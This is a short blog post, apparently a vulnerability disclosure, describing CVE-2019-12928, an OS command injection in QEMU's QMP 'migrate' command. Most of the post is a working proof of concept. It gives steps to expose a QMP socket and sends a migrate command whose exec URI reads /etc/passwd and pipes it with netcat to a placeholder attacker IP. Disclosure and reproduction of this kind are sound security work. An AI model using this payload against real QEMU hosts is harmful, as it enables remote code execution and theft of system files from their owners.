---
layout: post
title: "[CVE-2019-12928] QEMU Machine Protocol Migrate Command Execution"
date: 2019-06-05
categories:
    - blog
keywords: "qemu, qmp, command execution"
---

The QMP `migrate` command in QEMU version 4.0.0 and earlier is vulnerable to OS command injection, which allows the remote attacker to achieve code execution, denial of service, or information disclosure by sending a crafted QMP command to the listening server.

1st, execute the QEMU with `-qmp tcp:<ip_address>:1234,server,nowait`<br>
2nd, open another console and setup a listener to port 9999<br>
3rd, connect to the target and enter the following commands:<br>

```
{ "execute": "qmp_capabilities" }
{"return": {}}
{ "execute": "migrate", "arguments": { "uri": "exec:cat /etc/passwd | nc <attacker_ip> 9999" } }
{"return": {}}
```